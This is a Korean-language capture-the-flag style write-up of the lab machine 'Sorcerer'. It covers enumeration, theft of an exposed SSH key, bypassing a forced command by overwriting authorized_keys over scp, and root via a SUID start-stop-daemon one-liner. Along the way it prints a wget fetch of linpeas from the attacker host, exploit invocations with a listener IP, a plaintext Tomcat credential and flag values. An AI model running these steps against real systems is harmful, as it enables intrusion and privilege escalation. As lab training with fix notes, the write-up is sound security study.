---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/enum/dirbust
  - tech/exec/ssh-key
  - tech/enum/peas
  - tech/lin/suid
  - tech/svc/ssh-forced-command
type: machine
platform: pg
os: linux
ip: 192.168.120.100
ports: [22, 80, 111, 2049, 7742, 8080, 33065, 35835, 42329, 43307]
services: [http, mountd, nfs, nlockmgr, rpcbind, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.120.100` · Debian 10 (buster) · Intermediate · 플래그 2개
> 진입점: 비표준 포트 7742 nginx 열거 → `/zipfiles/max.zip` 홈 디렉터리 백업 노출(개인 SSH 키 포함) → `authorized_keys`의 `command="scp_wrapper.sh"` 강제 명령에 갇힘 → scp 전용 채널로 그 `authorized_keys` 자체를 덮어써 제한 해제 → `max` 완전 셸
> 권한상승: 비표준 SUID `/usr/sbin/start-stop-daemon` → GTFOBins `-x /bin/sh -- -p` → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.120.100

### Initial Access – 비표준 포트 웹의 zip 백업에서 SSH 개인키를 탈취하고 강제 명령을 authorized_keys 자체 덮어쓰기로 해제

**Vulnerability Explanation:**
- nginx 7742 웹루트에 홈 디렉터리 zip 백업이 그대로 배포됨. `max.zip` 안에 `.ssh/id_rsa`(패스프레이즈 없는 개인키)가 평문 포함
- 그 키의 `authorized_keys`에 `command="/home/max/scp_wrapper.sh"` 강제 명령(forced command)이 걸려 있어, 인증에 성공해도 클라이언트가 요청한 명령 대신 이 스크립트만 실행됨(`no-pty`도 동반 — 대화형 셸 자체가 안 뜸)
- 그러나 강제 명령이 `scp`(임의 경로 파일 쓰기 원시)이고, `authorized_keys` 자체도 `max` 소유 파일임 — **제한을 정의하는 파일을 그 제한된 채널로 덮어쓸 수 있음.** 옵션 필드만 제거한 새 파일을 같은 경로에 scp로 올리면 다음 접속부터 제한이 사라짐

**Vulnerability Fix:**
- 백업 아카이브를 웹서비스 경로 밖에 보관. 개인키·자격증명이 포함된 백업은 절대 웹루트에 두지 않음
- 강제 명령(`ForceCommand`)을 쓰려면 `authorized_keys`를 해당 사용자가 고칠 수 없게 관리 — `sshd_config`의 `AuthorizedKeysFile /etc/ssh/authorized_keys/%u`로 root 소유 디렉터리에 두거나 `Match User` 블록에서 서버 쪽으로 강제
- 유출된 개인키는 폐기·재발급(등록 제거만으로는 다른 호스트의 재사용까지 막지 못함)

**Severity:** High — 무인증 파일 노출로 획득한 키가 곧바로 완전한 사용자 셸로 이어짐. RCE가 즉시 성립하는 것은 아니라 Critical은 아님

**Steps to reproduce the attack:**
1. `-p-` 전수 포트 스캔으로 비표준 포트 7742의 nginx 확인
2. 디렉터리 열거로 `/zipfiles/` 확인 → 오픈 리스팅이므로 브라우저로 직접 열어 `max.zip` 등 4개 확인(스캐너는 리스팅 안을 재귀로 훑지 않음)
3. zip 다운로드·해제 → `home/max/.ssh/id_rsa`(개인키)·`home/max/.ssh/authorized_keys`(강제 명령 확인)
4. `authorized_keys`의 `command=` 옵션 필드를 제거한 새 파일을 `scp -O`로 같은 경로에 덮어씀
5. 개인키로 재접속 → 제한 해제된 완전 셸

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.120.100 | TCP: 22, 80, 111, 2049, 7742, 8080, 33065, 35835, 42329, 43307 |

```text
Not shown: 65525 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      42329/tcp   mountd
|   100005  1,2,3      59704/udp   mountd
|   100021  1,3,4      33065/tcp   nlockmgr
|   100021  1,3,4      51595/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.4
33065/tcp open  nlockmgr 1-4 (RPC #100021)
35835/tcp open  mountd   1-3 (RPC #100005)
42329/tcp open  mountd   1-3 (RPC #100005)
43307/tcp open  mountd   1-3 (RPC #100005)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
— 출처: `~/PG/Sorcerer/nmap.log` (`nmap -sCV -p- -Pn -A --min-rate 5000`, Jul 8 17:43:46 시작, 31.82초). 헤더·TRACEROUTE 절은 생략함

`-p-` 없이는 이 박스가 안 풀린다 — 정답 포트 7742가 top-1000 밖이다. `OpenSSH 7.9p1 Debian 10+deb10u2` 배너로 OS는 Debian 10(buster) 확정.

> [!warning] `OS details: Linux 5.0 - 5.14`는 오탐이다
> nmap의 OS 지문은 TCP/IP 스택 특성 추측이고, 열린 포트만 있고 닫힌 포트 표본이 부족하면 신뢰도가 떨어진다. 실제 buster의 표준 커널은 4.19 계열이다 — [[Pelican]]에서 같은 SSH 배너의 박스를 덤프해 `4.19.0-10-amd64`를 확인했다. 이 오탐을 믿고 커널 익스플로잇을 고르면 시간을 버린다(`Post-Exploitation` 절의 실패 경로 참고). **버전 판정은 독립 근거 2개** 규칙([[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]]) — 커널 버전은 셸을 잡은 뒤 `uname -a`로 확정해야 한다.

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ whatweb http://192.168.120.100:7742 > whatweb.log
http://192.168.120.100:7742 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.120.100], PasswordField[password], Script, Title[SORCERER], nginx

┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ whatweb http://192.168.120.100:8080 > whatweb_8080.log
http://192.168.120.100:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[192.168.120.100], Title[Apache Tomcat/7.0.4]
```
— 출처: `~/PG/Sorcerer/whatweb.log` · `whatweb_8080.log`(원본은 ANSI 색상 이스케이프 포함, 여기서는 제거). 명령 형태는 `~/.zsh_history`

포트 80에도 whatweb을 돌렸으나 같은 `whatweb.log` 로 리다이렉트해 7742 결과가 덮어썼다 — 80의 결과는 남아 있지 않다.

7742는 로그인 폼(`PasswordField`)이 있는 커스텀 앱. 8080은 `Server:` 헤더가 없어 whatweb이 버전을 못 뽑았고, 근거는 nmap의 title/favicon 지문 하나뿐이다.

![[Pasted image 20260710131947.png]]

7742의 `Control Panel` 로그인 폼. 여기에 기본 자격증명을 먼저 던졌으나 `Invalid Logon` — 커스텀 폼이라 제품 기본값 개념이 없었다. 정답은 폼이 아니라 디렉터리 열거 쪽에 있었다.

![[Pasted image 20260710132020.png]]

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer]
└─$ feroxbuster -u http://192.168.120.100:7742/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -x html,txt
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://192.168.120.100:7742/default => http://192.168.120.100:7742/default/
200      GET       65l      117w     1219c http://192.168.120.100:7742/
200      GET       65l      117w     1219c http://192.168.120.100:7742/index.html
200      GET        1l        3w       14c http://192.168.120.100:7742/default/index.html
301      GET        7l       12w      178c http://192.168.120.100:7742/zipfiles => http://192.168.120.100:7742/zipfiles/
200      GET       13l       81w     4749c http://192.168.120.100:7742/zipfiles/francis.zip
200      GET       13l       82w     4741c http://192.168.120.100:7742/zipfiles/miriam.zip
200      GET       39l      203w    13898c http://192.168.120.100:7742/zipfiles/max.zip
200      GET       13l       82w     4733c http://192.168.120.100:7742/zipfiles/sofia.zip
[####################] - 19m  1245789/1245789 0s      found:9       errors:0
[####################] - 19m   622887/622887  551/s   http://192.168.120.100:7742/
[####################] - 19m   622887/622887  551/s   http://192.168.120.100:7742/default/
[####################] - 0s    622887/622887  3261188/s http://192.168.120.100:7742/zipfiles/ => Directory listing (add --scan-dir-listings to scan)
```
— 출처: `파일보관\Pasted image 20260710133159.png`(feroxbuster 원 로그는 산출물에 보존되지 않음 — 화면 캡처가 유일한 실측). 배너·설정 표 부분은 생략함

![[Pasted image 20260710133159.png]]

feroxbuster는 `--scan-dir-listings` 없이는 리스팅 안의 파일을 재귀로 훑지 않는다는 것을 마지막 줄에서 스스로 알려준다. `francis`·`miriam`·`max`·`sofia`가 사람 이름 워드리스트에 있어 우연히 잡혔을 뿐이라, 리스팅이 켜진 경로는 워드리스트에 기대지 말고 브라우저로 직접 열어야 한다. 워드리스트가 622,887줄이라 스캔 자체는 19분이 걸렸다.

![[Pasted image 20260710132345.png]]

nginx 오픈 리스팅을 브라우저로 직접 확인. **크기가 답을 알려준다** — `max.zip` 8,274바이트 대 나머지 셋 2,834·2,826·2,818바이트다. 2.8KB는 `.bashrc`(3,526) + `.profile`(807) + `.bash_logout`(220) 스켈레톤을 압축한 정도라 `[가정]`, `max.zip`의 초과분이 추가 파일(SSH 키)이라는 신호다.

⚠️ 같은 파일에 대해 feroxbuster는 `13898c`·`4749c`·`4741c`·`4733c`를 보고했다. 리스팅의 실제 파일 크기와 일관되게 약 1.68배 부풀어 있다 — 바이너리 본문을 문자로 세는 과정의 산물로 보이나 원인은 확인하지 않았다 `[가정]`. **바이트 수를 근거로 삼을 때는 스캐너 요약이 아니라 리스팅·`Content-Length`·내려받은 파일 쪽을 볼 것.**

8080의 Tomcat 7.0.4는 오래된 버전이라 PUT 기반 JSP 업로드(CVE-2017-12617)를 첫 후보로 잡고 PoC 두 종을 실제로 돌렸으나 최종 경로에는 쓰이지 않았다(`Post-Exploitation` 절 참고).

NFS(2049, mountd 3개)는 `showmount -e 192.168.120.100` 을 실행한 기록이 `~/.zsh_history` 에 있으나 **출력이 어디에도 보존되지 않았다.** 익스포트 목록이 무엇이었는지는 **관측 없음**이고, `/home` 익스포트 여부·`no_root_squash` 여부는 확인되지 않은 채로 남았다.

### Initial Access – zip 백업 SSH 키 → authorized_keys 자체 덮어쓰기로 강제 명령 해제

`max.zip` 을 풀면 `home/max/` 홈 디렉터리가 통째로 나온다 — `.ssh/` 안에 `authorized_keys`·`id_rsa`·`id_rsa.pub` 셋이 그대로 들어 있다. 내려받기와 압축 해제는 Windows 브라우저·탐색기 쪽에서 했다 — 캡처된 경로가 `…\max\home\max\.ssh` 이고 Kali 쪽 `wget`·`unzip` 명령 기록은 없다.

![[Pasted image 20260710132554.png]]

풀어낸 파일을 Kali 작업 디렉터리로 옮긴 것이 아래다. `~/PG/Sorcerer/max/.ssh/` 는 손으로 만들어 키를 모아둔 것이라(`mkdir .ssh; mv * ./.ssh` — `~/.zsh_history`) zip 내부 구조와 1:1로 대응하지 않는다:

```text
/home/kali/PG/Sorcerer/max/:
total 32
drwxrwxr-x 3 kali kali 4096 Jul 10 13:44 .
drwxrwxr-x 4 kali kali 4096 Jul 10 14:56 ..
-rwxrw-rw- 1 kali kali  220 Apr 18  2019 .bash_logout
-rwxrw-rw- 1 kali kali 3526 Apr 18  2019 .bashrc
-rwxrw-rw- 1 kali kali  807 Apr 18  2019 .profile
-rwxrw-rw- 1 kali kali  133 Sep 25  2020 scp_wrapper.sh
drwxrwxr-x 2 kali kali 4096 Jul 10 14:01 .ssh
-rwxrw-rw- 1 kali kali 1991 Sep 25  2020 tomcat-users.xml.bak

/home/kali/PG/Sorcerer/max/.ssh/:
total 24
drwxrwxr-x 2 kali kali 4096 Jul 10 14:01 .
drwxrwxr-x 3 kali kali 4096 Jul 10 13:44 ..
-rw------- 1 kali kali  738 Jul 10 14:01 authorized_keys
-rw------- 1 kali kali  836 Jul 10 13:46 authorized_keys.bak
-rw------- 1 kali kali 3381 Sep 25  2020 id_rsa
-rw------- 1 kali kali  738 Sep 25  2020 id_rsa.pub
```
— 출처: `~/PG/Sorcerer/max/` 현재 상태. `authorized_keys.bak`(836B)이 zip 에서 나온 **원본**이고, `authorized_keys`(738B)는 옵션 필드를 제거해 타겟에 올린 **덮어쓰기용** 파일이다. 두 파일의 차이 98바이트가 곧 옵션 필드 길이다

개인 키가 그대로 있고, 키 주석이 소유자를 알려준다 — `max@sorcerer`. 같은 아카이브의 두 번째 선물은 Tomcat manager 평문 자격증명(`tomcat`/`VTUD2XxJjf5LPmu6`, `tomcat-users.xml.bak`) — 롤이 `manager-gui`뿐이라 화면 WAR 업로드만 가능하고 `manager-script`(API 배포)는 막혀 있다.

`authorized_keys`가 함정을 미리 알려준다:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ cat authorized_keys
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB…(4096비트 RSA 공개키 본문 생략)… max@sorcerer
```
```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ cat scp_wrapper.sh
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```
— 출처: `~/PG/Sorcerer/max/.ssh/authorized_keys.bak`(옵션 필드가 살아 있는 원본) · `~/PG/Sorcerer/max/scp_wrapper.sh`

`command=`는 클라이언트가 요청한 명령을 버리고 이 스크립트만 실행한다. 버려진 원래 명령은 `SSH_ORIGINAL_COMMAND`로 스크립트에 전달되고, 스크립트는 그 값이 `scp`로 시작하는지만 검사한 뒤 **인용 없이 그대로 실행**한다. 의도는 "이 키는 scp 전용"이지만, `scp`는 임의 경로에 쓸 수 있는 프로그램이고 `authorized_keys` 역시 `max` 소유 파일이다 — 옵션 필드만 지운 새 파일을 같은 경로로 올리면 다음 접속부터 제한이 사라진다.

`tomcat` 계정으로 먼저 SSH를 시도했다:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max]
└─$ ssh tomcat@192.168.120.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tomcat@192.168.120.100: Permission denied (publickey).
```
— 명령은 `~/.zsh_history` 로 확인됨. **출력 원문은 보존되지 않아 재구성이다 `[가정]`** (경고 3줄은 같은 날 캡처된 다른 SSH 화면과 동일 문구)

`(publickey)` — 괄호 안은 서버가 **허용하는 인증 방식 목록**이다. `(publickey)` 단독이면 패스워드 인증이 꺼져 있다는 뜻이라 `VTUD2XxJjf5LPmu6` 를 아무리 맞춰도 SSH 로는 못 들어간다. 즉시 접었다. `max` 개인키로 접속하면 인증은 통과하지만 `command=`·`no-pty` 때문에 래퍼의 `ACCESS DENIED.` 경로로 떨어진다.

옵션 필드만 제거한 새 파일을 만들어 같은 경로로 올린다:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ scp -O -i id_rsa authorized_keys max@192.168.120.100:/home/max/.ssh/authorized_keys
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
authorized_keys                                                      100%  738     8.0KB/s   00:00
```
— 명령은 `~/.zsh_history` 로 확인됨(`-O` 없는 시도가 먼저 있었고 그 뒤 `scp -h`·`man scp` 를 거쳐 `-O` 로 성공). **출력 원문은 보존되지 않아 재구성이다 `[가정]`**

`-O`가 필요한 이유 — OpenSSH 9.0부터 `scp`는 기본으로 SFTP 서브시스템을 쓴다. 그러면 서버가 받는 `SSH_ORIGINAL_COMMAND`가 `scp -t ...`가 아니라 `sftp`가 되어 래퍼의 `case 'scp'*` 매칭이 실패한다. `-O`가 레거시 `scp -t/-f` 프로토콜을 강제해 매칭을 통과시킨다.

![[Pasted image 20260710135852.png]]

`man scp` 의 `-O` 항목 — 이 화면이 답을 준 지점이다. 전송 후에는 `100% 738` 로 바이트 수가 원본과 일치하는지 확인한다(scp 는 원격에서 실패해도 로컬이 조용할 수 있다).

이어서 재접속하면 제한 없는 완전한 셸이 뜬다:

```bash
┌──(kali㉿kali)-[~/PG/Sorcerer/max/.ssh]
└─$ ssh -i id_rsa max@192.168.120.100
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Fri Jul 10 00:50:54 2026 from 192.168.45.215
max@sorcerer:~$ whoami
max
```
— 출처: `파일보관\Pasted image 20260710140254.png`

![[Pasted image 20260710140254.png]]

**Local.txt value:**
`c91395bd06b23a3455e9a6bf711184f3`
이 값은 사용자 셸 단계가 아니라 **`Privilege Escalation` 절의 root 셸에서 `/home/`을 순회하다** 발견했다. 표준 위치로 가정했던 `/home/max/local.txt`가 아니라 **`/home/dennis/local.txt`**다 — `max` 홈에는 애초에 `local.txt`가 없다(`ls` 결과: `1.txt`·`exploit`·`linpeas.sh`·`scp_wrapper.sh`·`tomcat-users.xml.bak`). `dennis` 계정의 용도·접근 경로는 조사하지 않았다 — 관측 없음.
— 출처: `파일보관\Pasted image 20260710151215.png`

### Privilege Escalation – 비표준 SUID `start-stop-daemon` (GTFOBins)

**Vulnerability Explanation:**
- SUID 열거(`find / -perm -4000 -type f` 계열, 여기서는 linpeas로 실행)에서 `/usr/sbin/start-stop-daemon`이 root 소유 SUID로 존재 — 데비안 기본은 SUID가 아니므로(`-rwxr-xr-x`) 박스 제작자가 붙인 것
- `start-stop-daemon`의 `--exec`(`-x`)는 지정한 임의 실행 파일을 실행하는 기능이 본질 — root SUID가 붙으면 "임의 프로그램을 root로 실행"과 동일해짐(GTFOBins SUID 항목)

**Vulnerability Fix:**
- `chmod u-s /usr/sbin/start-stop-daemon` — 데비안 기본값(비SUID)으로 복구
- 데몬 기동은 systemd 유닛으로 처리하고, 필요하면 좁게 범위를 잡은 `sudo` 정책으로 대체

**Severity:** Critical — SUID 한 줄로 즉시 root

**Steps to reproduce the attack:**
1. linpeas(수동 대안: `find / -perm -4000 -type f 2>/dev/null`)로 SUID 목록 열거
2. 표준 SUID 집합(`passwd`·`su`·`mount` 등)과 대조해 `start-stop-daemon`이 비정상임을 식별
3. GTFOBins SUID 탭에서 `start-stop-daemon -S -x /bin/sh -- -p` 확인
4. 실행 → root 셸 → `/root/proof.txt` 확인

```bash
max@sorcerer:~$ wget 192.168.45.215/linpeas.sh -O linpeas.sh
--2026-07-10 01:32:27--  http://192.168.45.215/linpeas.sh
Connecting to 192.168.45.215:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 975444 (953K) [application/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                100%[====================================>] 952.58K  1.68MB/s    in 0.6s

2026-07-10 01:32:28 (1.68 MB/s) - 'linpeas.sh' saved [975444/975444]

max@sorcerer:~$ ls
linpeas.sh  scp_wrapper.sh  tomcat-users.xml.bak
max@sorcerer:~$ ls -al
total 992
drwxr-xr-x 3 max  max    4096 Jul 10 01:32 .
drwxr-xr-x 7 root root   4096 Sep 24  2020 ..
-rw------- 1 max  max       5 Jul 10 00:49 .bash_history
-rw-r--r-- 1 max  max     220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 max  max    3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 max  max  975444 Dec 15  2025 linpeas.sh
-rw-r--r-- 1 max  max     807 Apr 18  2019 .profile
-rwxr-xr-x 1 max  max     133 Sep 24  2020 scp_wrapper.sh
drwx------ 2 max  max    4096 Sep 24  2020 .ssh
-rw-r--r-- 1 max  max    1991 Sep 24  2020 tomcat-users.xml.bak

max@sorcerer:~$ chmod 744 linpeas.sh
```

![[Pasted image 20260710143311.png]]

```text
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 113K Jun 24  2020 /usr/sbin/mount.nfs
-rwsr-xr-x 1 root root  44K Jun  3  2019 /usr/sbin/start-stop-daemon
-rwsr-xr-x 1 root root  63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root  35K Apr 22  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root  63K Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root  51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root  15K Oct  9  2019 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root  44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root  53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root  35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root  83K Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root  44K Jul 27  2018 /usr/bin/chsh
```
— 출처: `파일보관\Pasted image 20260710150807.png`(linpeas 출력 원문은 산출물에 보존되지 않음 — 화면 캡처가 유일한 실측). 캡처는 `chsh` 줄에서 잘려 있어 그 아래는 확인되지 않음

![[Pasted image 20260710150807.png]]

`passwd`·`su`·`mount`·`umount`·`newgrp`·`chfn`·`chsh`·`gpasswd`·`fusermount`·`vmware-user-suid-wrapper`는 데비안/VMware Tools 기본값이라 정상이다. `mount.nfs`도 정상이지만 NFS가 열려 있는 박스라 눈여겨볼 값어치는 있다. `start-stop-daemon`은 이 목록에 있으면 안 되는 관리 도구다 — linpeas의 `--->` 화살표는 여기 안 붙었다(화살표는 다른 OS의 옛 취약점 목록일 뿐이라 신뢰하지 않았다).

GTFOBins `start-stop-daemon` 페이지는 탭이 셋이다. Unprivileged/Sudo 탭은 `start-stop-daemon -S -x /bin/sh`, SUID 탭만 뒤에 `-- -p`가 붙는다.

![[Pasted image 20260710150903.png]]

![[Pasted image 20260710151033.png]]

SUID 탭의 Remarks 원문 — *"remember to omit the `-p` argument of every `/bin/sh` invocation for distributions where the default shell does not drop SUID privileges."* 데비안의 `/bin/sh`는 dash이고 dash는 기본적으로 `euid≠uid`면 euid를 uid로 되돌리므로, **여기서는 `-p`(privileged, 초기화 생략)가 필수**다. 앞의 `--`는 옵션 종료 구분자로, 없으면 `-p`가 `start-stop-daemon` 자신의 `--pidfile`로 해석된다.

```bash
max@sorcerer:/run/systemd$ /usr/sbin/start-stop-daemon -S -x /bin/sh -- -p
# whoami
root
# cat /root/proof.txt
621b7558ae3578abef3e8f4c73485357
#
```
— 출처: `파일보관\Pasted image 20260710151116.png`(pty 세션은 화면 캡처로만 보존)

![[Pasted image 20260710151116.png]]

### Post-Exploitation

**Proof.txt value:**
`621b7558ae3578abef3e8f4c73485357`

root 셸에서 `/home/` 을 순회해 다른 계정들을 확인했다:

```text
# cd /home/
# ls
dennis  francis  max  miriam  sofia
# tree
/bin/sh: 5: tree: not found
# cd max
# ls
1.txt  exploit  linpeas.sh  scp_wrapper.sh  tomcat-users.xml.bak
# cd ..
# cd dennis
# ls
local.txt
# cat local.txt
c91395bd06b23a3455e9a6bf711184f3
```
— 출처: `파일보관\Pasted image 20260710151215.png`

**버린 경로 둘**

- **Tomcat CVE-2017-12617 (PUT + 트레일링 슬래시로 JSP 업로드).** nmap 종료 12분 뒤인 7월 8일 17:56에 PoC를 클론하고 실제로 돌렸다 — `cyberheartmi9/CVE-2017-12617`(`python2 tomcat-cve-2017-12617.py -u http://192.168.120.100:8080`)을 먼저, 지우고 나서 `LongWayHomie/CVE-2017-12617`(`-t 192.168.120.100 -p 8080 -l 192.168.45.175 -P 4444`)을 다음으로. **출력이 하나도 보존되지 않아 성공·실패 이유는 관측 없음.** 산출물로 확정되는 것은 클론과 실행이 있었다는 사실까지다(`~/PG/Sorcerer/CVE-2017-12617/` · `~/.zsh_history`). 이 CVE는 `readonly` 초기화 파라미터가 기본 `true`라 PUT 자체가 405로 막히는 것이 보통이므로, 전제조건(`curl -i -X OPTIONS`로 `Allow:` 헤더에 PUT이 있는지)에서 걸렸을 가능성이 있다 `[가정]`
- **커널 익스플로잇 CVE-2021-22555**(netfilter `xt_compat_target_from_user`). Kali에서 컴파일까지 갔다(`~/PG/Sorcerer/exploit.c` 14:54 · `exploit` 782,560B 14:56). 소스 55행이 이미 답을 갖고 있었다 — `Exploit tested on Ubuntu 5.8.0-48-generic and COS 5.4.89+.`이고 95~96행에서 `#define KERNEL_UBUNTU_5_8_0_48 1`이 켜져 있다. ROP 가젯 오프셋이 그 두 빌드 전용이라 Debian 10(4.19 계열)에서는 성공이 아니라 패닉이 정상 결과다. **`Service Enumeration` 절의 nmap OS 오탐(`Linux 5.0 - 5.14`)을 믿고 고른 방향이었다.** 15분 뒤 SUID `start-stop-daemon` 한 줄로 root를 잡았다

**남긴 흔적**
- `/home/max/.ssh/authorized_keys`를 옵션 필드가 제거된 버전으로 덮어썼다. 원본은 `~/PG/Sorcerer/max/.ssh/authorized_keys.bak`에 보관돼 있다 — 복구하려면 그 파일을 같은 경로로 되올린다
- `/home/max/linpeas.sh` 업로드, 삭제하지 않았다
- `/home/max/exploit`·`/home/max/1.txt` — root 셸의 `/home/max/` 목록에 둘 다 존재한다. `exploit` 은 CVE-2021-22555 바이너리를 올린 것으로 보인다 `[가정]`. 업로드 명령 자체는 산출물·`~/.zsh_history` 어디에도 없고, 실행 여부·결과도 관측 없음. `1.txt` 의 내용은 확인하지 않았다
- 계정 생성·설정 변경 없음(`authorized_keys` 덮어쓰기 제외)
- Kali 리스너 없음(SSH 경로라 리버스셸을 쓰지 않았다). tmux 세션·NFS 마운트 사용 없음

## 관련

- GTFOBins `start-stop-daemon`: https://gtfobins.org/gtfobins/start-stop-daemon/
- `sshd(8)` AUTHORIZED_KEYS FILE FORMAT(`command=`·`no-pty`·`SSH_ORIGINAL_COMMAND`): https://man.openbsd.org/sshd.8
- `scp(1)` `-O`(레거시 SCP 프로토콜 강제): https://man.openbsd.org/scp
- OpenSSH 9.0 릴리스 노트(scp 기본 전송 방식 SFTP 전환): https://www.openssh.com/txt/release-9.0
- CVE-2021-22555 원저자 글(Andy Nguyen): https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
- CVE-2017-12617 (`readonly` 초기화 파라미터가 `false`일 때만 성립 — HTTP PUT 활성 전제): https://nvd.nist.gov/vuln/detail/CVE-2017-12617
- [[Pelican]] — 같은 Debian 10 / OpenSSH 7.9p1 배너. `uname` 실측이 4.19였다 — Service Enumeration의 nmap OS 오탐 반증 근거
- [[_PLAYBOOK#A-37. rbash 대상에 `scp` 가 조용히 끊긴다]] — 이 박스의 강제 명령 래퍼도 같은 `-O` 메커니즘으로 통과함(다른 증상, 같은 원인)
- [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]] — `start-stop-daemon -x /bin/sh -- -p`도 같은 dash euid 메커니즘
- [[_PLAYBOOK#A-3-14. SSH 인증은 되는데 셸이 안 뜬다 — 강제 명령(`command=`)은 자기 자신을 정의하는 파일까지 막지 못한다]] — 제한된 원시로 제한 자체를 덮어쓰는 일반화
- [[_PLAYBOOK#B-1-46. Tomcat CVE-2017-12617 — PUT + 트레일링 슬래시로 확장자 매퍼 우회 (JSP 업로드 RCE)]] — 검토했으나 최종 경로에는 쓰지 않은 갈래
- [[_PLAYBOOK#B-24. 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다]] — 컴파일 전에 `#define`·"Tested on" 을 읽는 규칙
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] — 누적 패턴 "버전 판정은 독립 근거 2개"
